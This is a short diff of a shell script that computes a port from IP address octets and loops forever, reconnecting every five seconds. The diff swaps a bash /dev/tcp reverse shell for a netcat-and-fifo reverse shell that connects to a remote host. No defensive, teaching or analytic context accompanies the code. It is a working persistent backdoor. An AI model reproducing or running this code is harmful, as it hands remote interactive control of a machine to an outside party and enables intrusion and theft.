@@ -6,6 +6,6 @@ FOURTH=$(echo "$CIP" | cut -d'.' -f4)
 P=$(($C + $SECOND*100 + $FOURTH))
 
 while true; do
-    bash -i >& /dev/tcp/"$I"/"$P" 0>&1 2>/dev/null
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc "$I" "$P" >/tmp/f
     sleep 5
 done
